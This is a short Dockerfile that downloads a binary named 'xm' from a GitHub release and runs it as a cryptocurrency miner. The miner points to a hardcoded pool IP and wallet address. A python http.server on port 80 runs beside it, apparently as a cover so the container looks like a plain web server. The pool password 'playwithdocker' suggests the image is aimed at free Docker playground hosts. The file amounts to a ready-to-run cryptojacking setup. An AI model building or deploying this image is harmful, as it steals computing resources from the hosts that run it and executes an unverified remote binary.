FROM python:3.9.18-slim
RUN apt-get update \
	&& apt-get install -y wget \
	&& rm -rf /var/lib/apt/lists/*
USER root
ENV POOL_URL 107.178.97.202:4444
ENV POOL_USER ZEPHsAMLgSJhN28snus2P4ZR3P3PTD4np1ZYzan1w6HNeq5T6ackkgFSkoevQESJhTWJ8XT12ufkhfp2CSd88gfTS8vxVeBH2hZ
ENV POOL_PW playwithdocker
WORKDIR /home/miner
RUN wget https://github.com/ddao2604/tech/releases/download/1.0/xm \
	&& chmod +x xm
EXPOSE 80
CMD python -m http.server 80 & ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k --no-title --log-file=log.txt --donate-over-proxy=107.178.97.202:4444
